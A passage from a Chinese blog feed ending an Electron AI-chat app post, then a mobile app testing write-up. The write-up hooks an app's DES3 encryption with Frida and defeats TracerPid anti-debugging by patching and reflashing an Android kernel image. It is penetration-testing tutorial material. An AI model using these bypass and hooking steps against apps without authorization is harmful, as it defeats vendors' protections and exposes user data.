方法</span></span><br><span class="line">  <span class="variable language_">window</span>.<span class="property">electron</span>.<span class="title function_">openVersionDialog</span>();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></div><blockquote><p> preload.js 分析</p></blockquote><div class="highlight-wrap" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * 预加载脚本 (preload.js)</span></span><br><span class="line"><span class="comment"> * 作用：在渲染进程和主进程之间建立安全可控的通信桥梁</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 导入 Electron 模块</span></span><br><span class="line"><span class="keyword">const</span> &#123; contextBridge, ipcRenderer &#125; = <span class="built_in">require</span>(<span class="string">&quot;electron&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 使用上下文桥接技术安全暴露 IPC 方法到渲染进程</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">contextBridge.<span class="title function_">exposeInMainWorld</span>(<span class="string">&quot;electron&quot;</span>, &#123;</span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * 打开代理设置窗口</span></span><br><span class="line"><span class="comment">   * 通信流程：</span></span><br><span class="line"><span class="comment">   * 渲染进程 -&gt; preload.js -&gt; 主进程 (ipcMain.handle(&#x27;open-proxy-dialog&#x27;))</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="attr">openProxyDialog</span>: <span class="function">() =&gt;</span> ipcRenderer.<span class="title function_">invoke</span>(<span class="string">&#x27;open-proxy-dialog&#x27;</span>),</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * 设置网络代理</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> &#123;<span class="type">string</span>&#125; <span class="variable">proxyAddress</span> - 代理地址 (格式：host:port)</span></span><br><span class="line"><span class="comment">   * 通信流程：</span></span><br><span class="line"><span class="comment">   * 渲染进程 -&gt; 主进程 (ipcMain.handle(&#x27;set-proxy&#x27;))</span></span><br><span class="line"><span class="comment">   * 主进程通过 session.setProxy 应用代理设置</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="attr">setProxy</span>: <span class="function">(<span class="params">proxyAddress</span>) =&gt;</span> ipcRenderer.<span class="title function_">invoke</span>(<span class="string">&#x27;set-proxy&#x27;</span>, proxyAddress),</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * 清除代理设置</span></span><br><span class="line"><span class="comment">   * 通信流程：</span></span><br><span class="line"><span class="comment">   * 渲染进程 -&gt; 主进程 (ipcMain.handle(&#x27;clear-proxy&#x27;))</span></span><br><span class="line"><span class="comment">   * 主进程通过 session.setProxy(&#123;&#125;) 重置代理</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="attr">clearProxy</span>: <span class="function">() =&gt;</span> ipcRenderer.<span class="title function_">invoke</span>(<span class="string">&#x27;clear-proxy&#x27;</span>),</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * 打开版本信息窗口</span></span><br><span class="line"><span class="comment">   * 通信流程：</span></span><br><span class="line"><span class="comment">   * 渲染进程 -&gt; 主进程 (ipcMain.handle(&#x27;open-version-dialog&#x27;))</span></span><br><span class="line"><span class="comment">   * 主进程创建 about 窗口</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="attr">openVersionDialog</span>: <span class="function">() =&gt;</span> ipcRenderer.<span class="title function_">invoke</span>(<span class="string">&#x27;open-version-dialog&#x27;</span>)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></div><h4 id="3-2-5-自定义"><a href="#3-2-5-自定义" class="headerlink" title="3.2.5 自定义"></a>3.2.5 自定义</h4><p>若需要加入个人习惯的程序， 只需修改两部分代码即可</p><p>1）index.html 中的 <div class="ai_module"> 中添加一个 <div class="icon-item"></p><p><a data-fancybox="gallery" data-src="/../images/ai/ai_talk/2.png" data-caption="2"><img src="/../images/ai/ai_talk/2.png" alt="2"></a></p><p>2）renderer.js 中添加 index 的按钮元素以及需要加载的链接即可</p><p><a data-fancybox="gallery" data-src="/../images/ai/ai_talk/3.png" data-caption="3"><img src="/../images/ai/ai_talk/3.png" alt="3"></a></p><p>例子：添加 deepseek 大模型</p><p>1）修改 index.html 添加 deepseek 按钮元素</p><p><a data-fancybox="gallery" data-src="/../images/ai/ai_talk/4.png" data-caption="4"><img src="/../images/ai/ai_talk/4.png" alt="4"></a></p><p>2）renderer.js 中添加index.html 按钮元素，并指定跳转的 url</p><p><a data-fancybox="gallery" data-src="/../images/ai/ai_talk/5.png" data-caption="5"><img src="/../images/ai/ai_talk/5.png" alt="5"></a></p><h2 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h2><p>本项目基于个人使用习惯驱动，Ai 时代，简单的重复性和文字性的工作不应该浪费我们的时间。</p>]]></content>
      
      
      <categories>
          
          <category> 应用开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AI </tag>
            
            <tag> 开发记录 </tag>
            
            <tag> 开源 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>APP测试系列-绕过TracerPID检测 Hook加密数据</title>
      <link href="/2025/01/19/APP%E6%B5%8B%E8%AF%95%E7%B3%BB%E5%88%97-%E7%BB%95%E8%BF%87%20TracerPID%20%E6%A3%80%E6%B5%8B%20Hook%20%E5%8A%A0%E5%AF%86%E6%95%B0%E6%8D%AE/"/>
      <url>/2025/01/19/APP%E6%B5%8B%E8%AF%95%E7%B3%BB%E5%88%97-%E7%BB%95%E8%BF%87%20TracerPID%20%E6%A3%80%E6%B5%8B%20Hook%20%E5%8A%A0%E5%AF%86%E6%95%B0%E6%8D%AE/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><blockquote><p>说来惭愧，站内文章多月未更，客官抱歉，后续会逐步恢复更新。此文章首发 Seebug Paper <a href="https://paper.seebug.org/3215/">https://paper.seebug.org/3215/</a> 转载请注明来源。</p></blockquote><h2 id="一、起因"><a href="#一、起因" class="headerlink" title="一、起因"></a>一、起因</h2><p>在对某一 APP 进行测试时，发现该 APP 对传输的数据包进行了加密，近几年 APP 方面的防护也逐渐提高，大型企业的 APP 传输数据包加密也是常规操作了，在尝试进行 Hook 时出现了报错，其中的报错信息引出了该文。本文主要内容为通过修改 Android 内核文件从而实现绕过 TracerPID 检测进而 Hook 加密数据。</p><p><a data-fancybox="gallery" data-src="/../images/app/TracerPID/1.png" data-caption="1"><img src="/../images/app/TracerPID/1.png" alt="1"></a></p><h2 id="二、分析"><a href="#二、分析" class="headerlink" title="二、分析"></a>二、分析</h2><p>对该 APP 进行抓包时，发现 APP 请求数据包以及返回包均作了加密处理，看到数据加密，本能反应反编译查看源码，定位加密算法。</p><p><a data-fancybox="gallery" data-src="/../images/app/TracerPID/2.png" data-caption="2"><img src="/../images/app/TracerPID/2.png" alt="2"></a></p><p>将 APK 拖进 GDA 反编译，下载地址：<a href="http://www.gda.wiki:9090/%EF%BC%8CAPP">http://www.gda.wiki:9090/，APP</a> 已被加固。</p><p><a data-fancybox="gallery" data-src="/../images/app/TracerPID/3.png" data-caption="3"><img src="/../images/app/TracerPID/3.png" alt="3"></a></p><p>脱壳后获取到多个 dex，将 dex 打包在一个文件夹后拉入GDA 进行分析，根据上面加密的特征搜索 xxxKey 关键字定位算法位置。</p><p><a data-fancybox="gallery" data-src="/../images/app/TracerPID/4.png" data-caption="4"><img src="/../images/app/TracerPID/4.png" alt="4"></a></p><p>代码如下，根据定位可知 str &#x3D; xxxDES3Util.encode(str); 数据传输使用了 xxxDES3Util.encode() 方法，可以先对该方法进行 Hook 查看其函数输出的数据是什么。</p><p><a data-fancybox="gallery" data-src="/../images/app/TracerPID/5.png" data-caption="5"><img src="/../images/app/TracerPID/5.png" alt="5"></a></p><p>由于个人使用习惯，转而利用 Jadx 打开 dex 然后利用 Jadx 自带的插件对该方法生成 Frida Hook 脚本。对比两图可知，不同的软件进行反编译代码会存在一定的差异，所以在进行反编译时不妨多尝试几个软件，对比一下。</p><p><a data-fancybox="gallery" data-src="/../images/app/TracerPID/6.png" data-caption="6"><img src="/../images/app/TracerPID/6.png" alt="6"></a></p><p>Jadx 中鼠标放置到需要进行 Hook 的方法处，然后右键复制为 frida 代码即可得到一个 js 脚本，稍作修饰即可直接利用进行 hook。</p><p><a data-fancybox="gallery" data-src="/../images/app/TracerPID/7.png" data-caption="7"><img src="/../images/app/TracerPID/7.png" alt="7"></a></p><p>得到的脚本如下：</p><div class="highlight-wrap" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> xxxDES3Util = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;cn.xxxx.encryption.xxxDES3Util&quot;</span>);</span><br><span class="line">xxxDES3Util[<span class="string">&quot;encode&quot;</span>].<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">str</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`xxxDES3Util.encode is called: str=<span class="subst">$&#123;str&#125;</span>`</span>);</span><br><span class="line">    <span class="keyword">let</span> result = <span class="variable language_">this</span>[<span class="string">&quot;encode&quot;</span>](str);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`xxxDES3Util.encode result=<span class="subst">$&#123;result&#125;</span>`</span>);</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div><p>完善后的完整 Hook 脚本如下:</p><div class="highlight-wrap" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> xxxDES3Util = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;cn.xxxx.encryption.xxxDES3Util&quot;</span>);</span><br><span class="line">    xxxDES3Util[<span class="string">&quot;encode&quot;</span>].<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">str</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`xxxDES3Util.encode is called: str=<span class="subst">$&#123;str&#125;</span>`</span>);</span><br><span class="line">        <span class="keyword">let</span> result = <span class="variable language_">this</span>[<span class="string">&quot;encode&quot;</span>](str);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`xxxxDES3Util.encode result=<span class="subst">$&#123;result&#125;</span>`</span>);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></div><p>电脑 ADB 连接手机，手机上启动 frida server，尝试进行 Hook 查看返回结果，出现报错如下，程序自动退出，由报错信息可知，引出问题，关键在于：</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FATAL EXCEPTION：SafeGuardThread</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/app/TracerPID/8.png" data-caption="1"><img src="/../images/app/TracerPID/8.png" alt="1"></a></p><p>直接在反编译中搜索关键字 <code>SafeGuardThread</code>，粗略查看代码，大概猜到是一个检测手段， 关键信息在 <code>/proc/%d/status</code> 、<code>TracerPid</code> 搜索引擎搜索关键字得知该代码为一个反调试的手段，网上存在相同代码的解决方案。</p><p><a data-fancybox="gallery" data-src="/../images/app/TracerPID/9.png" data-caption="9"><img src="/../images/app/TracerPID/9.png" alt="9"></a></p><p>整合上面信息，由于请求数据加密且存在 TracerPid 反调试机制，想要进一步分析需要进行反反调试，想要绕过机制，首先得了解它的具体反调试手段是什么。通过一番搜索，得知 TracerPid 反调试机制为：</p><ul><li><p>当进程正常运行时,它的 TracerPID 值为 0,表示没有被调试。</p></li><li><p>当调试器附加到进程上时,操作系统会为该进程设置一个非 0 的 TracerPID 值,用来标识当前正在调试该进程。</p></li><li><p>TracerPID 反调试机制会定期检查进程的 TracerPID 值,如果发现它不为 0,就判断该进程正在被调试,然后采取相应的反调试措施,比如退出程序或抛出异常等。</p></li></ul><p>没有被调试的正常进程 TracerPid 值。</p><p><a data-fancybox="gallery" data-src="/../images/app/TracerPID/10.png" data-caption="10"><img src="/../images/app/TracerPID/10.png" alt="10"></a></p><p>当调试器附加到进程上时的 TracerPid 值。</p><p><a data-fancybox="gallery" data-src="/../images/app/TracerPID/11.png" data-caption="11"><img src="/../images/app/TracerPID/11.png" alt="11"></a></p><h2 id="三、绕过-TracerPid-检测"><a href="#三、绕过-TracerPid-检测" class="headerlink" title="三、绕过 TracerPid 检测"></a>三、绕过 TracerPid 检测</h2><p>绕过 TracerPid 检测机制常见的有两种手段：<code>1、Hook 关键代码，修改 TracerPid 值为 0，绕过检测</code>；<code>2、修改 Android 系统内核，使 TracerPid 值默认为 0</code> 。这边直接选用第二种的方法，直接修改 Android 设备中的 TracerPid 值，一劳永逸，当下次遇到同样的反调试方案时直接利用该设备测试即可。该绕过方法的主要操作步骤为：</p><ul><li>提取手机设备的 boot.img(系统镜像文件)。</li><li>修改 boot.img 中的 kerner(内核文件)中的 TracerPid 值。</li><li>刷入修改后的 boot.img 文件，使 TracerPid 值默认为 0。</li></ul><h3 id="1、提取-boot-img"><a href="#1、提取-boot-img" class="headerlink" title="1、提取 boot.img"></a>1、提取 boot.img</h3><p>boot.img 为系统镜像文件,包含了 Android 设备在启动过程中所需的关键系统组件,是确保设备正确启动和运行的基础，它包含了以下几个主要部分：( 本文设备为 小米 Mix 2s 已 root )</p><ul><li><p><strong>内核(Kernel)</strong>: Android操作系统的核心部分,负责管理硬件资源、驱动设备、内存管理等基础功能。</p></li><li><p><strong>初始化系统(Init)</strong>: 负责在系统启动时初始化各种服务和进程,是引导系统启动的关键组件。</p></li><li><p><strong>Recovery</strong>: 一个备用的操作系统环境,用于在设备出现问题时进行系统修复和恢复。</p></li><li><p><strong>Ramdisk</strong>: 一个临时的内存文件系统,在系统启动时用于加载必要的驱动和配置文件。</p></li></ul><p>1、首先需要利用具有传输数据的数据线连接手机设备，然后电脑利用 <a href="https://developer.android.google.cn/tools/releases/platform-tools?hl=zh-cn#downloads">adb</a> 连接设备，通常 <code>boot.img</code> 位于手机设备的 <code>/dev/block/platform/soc/xxx/by-name</code> ,其中 <code>xxx</code> 为 <code>soc</code> 目录下的一个文件夹，每台设备的文件夹名称不一致，具体名称自行查看即可，操作命令如下：</p><div class="highlight-wrap" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">adb 连接设备</span></span><br><span class="line">D:\app\platform-tools&gt;adb.exe shell</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">root 权限进行 boot.img 目录</span></span><br><span class="line">polaris:/ $ su</span><br><span class="line">polaris:/ # cd /dev/block/platform/soc/</span><br><span class="line">polaris:/dev/block/platform/soc # ls</span><br><span class="line">1d84000.ufshc</span><br><span class="line">polaris:/dev/block/platform/soc # cd 1d84000.ufshc/</span><br><span class="line">polaris:/dev/block/platform/soc/1d84000.ufshc # ls</span><br><span class="line">polaris:/dev/block/platform/soc/1d84000.ufshc # cd by-name/</span><br><span class="line">polaris:/dev/block/platform/soc/1d84000.ufshc/by-name # ls</span><br></pre></td></tr></table></figure></div><p>根据上面命令可知 boot.img 位于 by-name 目录下。</p><p><a data-fancybox="gallery" data-src="/../images/app/TracerPID/12.png" data-caption="12"><img src="/../images/app/TracerPID/12.png" alt="12"></a></p><p>通过 ls -al 命令可以查看到 boot.img 文件的存储分区位置为 <code>/dev/block/sde45</code>。</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">polaris:/dev/block/platform/soc/1d84000.ufshc/by-name # ls -al</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/app/TracerPID/13.png" data-caption="13"><img src="/../images/app/TracerPID/13.png" alt="13"></a></p><p>2、利用 dd （Data Duplicator 数据复制器）命令，将 &#x2F;dev&#x2F;block&#x2F;sde45 中的 boot.img 复制到 &#x2F;data&#x2F;local&#x2F;tmp 目录处，原因是避免设备权限问题无法直接利用 adb  pull 该文件至电脑处，复制至 &#x2F;data&#x2F;local&#x2F;tmp 处普通权限亦能 pull。</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dd if=/dev/block/sde45 of=/data/local/tmp/boot.img</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/app/TracerPID/14.png" data-caption="14"><img src="/../images/app/TracerPID/14.png" alt="14"></a></p><p>利用 adb pull boot.img至电脑。</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb pull /data/local/tmp/boot.img D:\app\platform-tools</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/app/TracerPID/15.png" data-caption="15"><img src="/../images/app/TracerPID/15.png" alt="15"></a></p><p><a data-fancybox="gallery" data-src="/../images/app/TracerPID/16.png" data-caption="16"><img src="/../images/app/TracerPID/16.png" alt="16"></a></p><h3 id="2、修改内核文件"><a href="#2、修改内核文件" class="headerlink" title="2、修改内核文件"></a>2、修改内核文件</h3><p>需要用到 Android_boot_image_editor 进行修改，下载地址：<a href="https://github.com/cfig/Android_boot_image_editor%EF%BC%8C%E7%AC%94%E8%80%85%E5%88%A9%E7%94%A8%E7%9A%84%E6%98%AF">https://github.com/cfig/Android_boot_image_editor，笔者利用的是</a> Ubuntu。</p><p>1）下载工具</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/cfig/Android_boot_image_editor.git</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/app/TracerPID/17.png" data-caption="17"><img src="/../images/app/TracerPID/17.png" alt="17"></a></p><p>2）将刚才从 Android 设备中 pull 出来的 boot.img 上传至 ubuntu 的 Android_boot_image_editor 工具处</p><p><a data-fancybox="gallery" data-src="/../images/app/TracerPID/18.png" data-caption="18"><img src="/../images/app/TracerPID/18.png" alt="18"></a></p><p><a data-fancybox="gallery" data-src="/../images/app/TracerPID/19.png" data-caption="19"><img src="/../images/app/TracerPID/19.png" alt="19"></a></p><p>3）利用 Android_boot_image_editor 解压 boot.img，执行命令后会下载一下依赖，等待一会即可</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./gradlew unpack</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/app/TracerPID/20.png" data-caption="20"><img src="/../images/app/TracerPID/20.png" alt="20"></a></p><p>出现 BUILD SUCCESSFUL 解包完成</p><p><a data-fancybox="gallery" data-src="/../images/app/TracerPID/21.png" data-caption="21"><img src="/../images/app/TracerPID/21.png" alt="21"></a></p><p>解包完的文件在 build&#x2F;unzip_boot 目录下</p><p><a data-fancybox="gallery" data-src="/../images/app/TracerPID/22.png" data-caption="22"><img src="/../images/app/TracerPID/22.png" alt="22"></a></p><p>4）修改 build&#x2F;unzip_boot 文件夹中的 kernel 文件，我们需要的操作就是解开 kernel 文件，然后修改部分参数，实现 TracerPid 值默认为0，从而实现绕过检测。需要注意的是，先利用 binwalk 分析一下 kernel 文件，存在一个 gzip 文件，gzip 下面是设备文件，其中 0x0 下面第一个 HEXDECIMAL 等一下需要用到</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk kernel</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/app/TracerPID/23.png" data-caption="23"><img src="/../images/app/TracerPID/23.png" alt="23"></a></p><p>5）现在我们需要提取出头部的 gzip，解压修改后拼接回去，这边利用网上现有的 python 脚本进行提取,其中 0xD3FD68 根据自己的 kernel 文件利用 binwalk 查询后自行进行替换</p><div class="highlight-wrap" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./kernel&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">content=f.read(<span class="number">0xD3FD68</span>)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./kernel_core.gz&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(content)</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/app/TracerPID/24.png" data-caption="24"><img src="/../images/app/TracerPID/24.png" alt="24"></a></p><p>执行完 py 脚本后得到 kernel_core.gz 文件</p><p><a data-fancybox="gallery" data-src="/../images/app/TracerPID/25.png" data-caption="25"><img src="/../images/app/TracerPID/25.png" alt="25"></a></p><p>将 kernel_core.gz  文件复制出来 windows 上然后进行解压，利用  010 Editor 进行修改，下载地址：<a href="https://www.sweetscape.com/010editor/%EF%BC%8C%E7%9B%B4%E6%8E%A5">https://www.sweetscape.com/010editor/，直接</a> Ctrl + F 搜索 Text 类型：TracerPid</p><p><a data-fancybox="gallery" data-src="/../images/app/TracerPID/26.png" data-caption="26"><img src="/../images/app/TracerPID/26.png" alt="26"></a></p><p>鼠标放置 00 00 即定位到 TracerPid 中的第二个 <code>.</code>  处，修改为 30 09，修改后，点击保存ctrl+s，若不放心可保存退出后重新利用 010 editor 打开查看是否已经修改</p><p><a data-fancybox="gallery" data-src="/../images/app/TracerPID/27.png" data-caption="27"><img src="/../images/app/TracerPID/27.png" alt="27"></a></p><p><a data-fancybox="gallery" data-src="/../images/app/TracerPID/28.png" data-caption="28"><img src="/../images/app/TracerPID/28.png" alt="28"></a></p><p>6）将 kernel_core 重命名为 kernel，然后拷贝回 Android_boot_image_editor 目录下进行压缩</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gzip -n -f -9 kernel</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/app/TracerPID/29.png" data-caption="29"><img src="/../images/app/TracerPID/29.png" alt="29"></a></p><p><a data-fancybox="gallery" data-src="/../images/app/TracerPID/30.png" data-caption="30"><img src="/../images/app/TracerPID/30.png" alt="30"></a></p><p>7）移动到 Android_boot_image_editor-master&#x2F;build&#x2F;unzip_boot 目录下</p><p><a data-fancybox="gallery" data-src="/../images/app/TracerPID/31.png" data-caption="31"><img src="/../images/app/TracerPID/31.png" alt="31"></a></p><p>然后利用脚本对原 kernel 进行拼接(注意脚本中的 f.seek()参数值为此前利用 binwalk 查询到的值)</p><div class="highlight-wrap" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./kernel.gz&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">content=f.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./kernel&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.seek(<span class="number">0xD3FD68</span>)</span><br><span class="line">    content += f.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./kernel_new&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(content)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/app/TracerPID/32.png" data-caption="32"><img src="/../images/app/TracerPID/32.png" alt="32"></a></p><p>执行完脚本后，该目录会出现一个名为 kernel_new 的新文件</p><p><a data-fancybox="gallery" data-src="/../images/app/TracerPID/33.png" data-caption="33"><img src="/../images/app/TracerPID/33.png" alt="33"></a></p><p>8）删除原 kernel 文件，并将 kernel_new 修改为 kernel，并删除多余文件，可对比之前解压的</p><p>原始解压文件</p><p><a data-fancybox="gallery" data-src="/../images/app/TracerPID/34.png" data-caption="34"><img src="/../images/app/TracerPID/34.png" alt="34"></a></p><p>将原 kernel 删除后，将 kernel_new重命名为 kernel 并删除多余文件后</p><p><a data-fancybox="gallery" data-src="/../images/app/TracerPID/35.png" data-caption="35"><img src="/../images/app/TracerPID/35.png" alt="35"></a></p><p>9）最后回到 Android_boot_image_editor 根目录下，执行命令重新打包</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./gradlew pack</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/app/TracerPID/36.png" data-caption="36"><img src="/../images/app/TracerPID/36.png" alt="36"></a></p><p>boot.img.signed 为重打包后的文件，即我们修改 TracerPid 值后需要重新刷回手机的 boot.img 文件</p><p><a data-fancybox="gallery" data-src="/../images/app/TracerPID/37.png" data-caption="37"><img src="/../images/app/TracerPID/37.png" alt="37"></a></p><h3 id="3、刷入新的-boot-img"><a href="#3、刷入新的-boot-img" class="headerlink" title="3、刷入新的 boot.img"></a>3、刷入新的 boot.img</h3><p>刷入 boot.img，<strong>注意需要先将旧的 boot.img 以及修改后的 boot.img 拷贝进手机上，这一点非常重要</strong>，因为如果你没有把系统原先的 boot.img 文件保存下来，当新的 boot.img 文件存在问题可能导致无法进入系统，那手机设备就处于一个危险的处境，这时若保存了旧的 boot.img 文件时，直接刷回去就可以恢复原先的系统。这边利用第三方的  recovery 重新输入 boot.img（刷入recovery请看文末）。</p><p>1）将新旧的 boot.img 放置在手机设备上的同一目录下，此处 boot_new.img 即上文中 boot.img.signed 文件，修改名字即可。</p><p><a data-fancybox="gallery" data-src="/../images/app/TracerPID/38.png" data-caption="38"><img src="/../images/app/TracerPID/38.png" alt="38"></a></p><p>2）手机进行 recovery 模式，选择 boot_new.img 刷入新的系统镜像文件，刷入后重启手机即可。</p><p><a data-fancybox="gallery" data-src="/../images/app/TracerPID/39.jpg" data-caption="39"><img src="/../images/app/TracerPID/39.jpg" alt="39"></a></p><h2 id="四、Hook-分析"><a href="#四、Hook-分析" class="headerlink" title="四、Hook 分析"></a>四、Hook 分析</h2><p>通过上面的修改系统内核实现了绕过 TracerPid 检测，现在重新利用 frdia Hook 加密函数。</p><div class="highlight-wrap" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 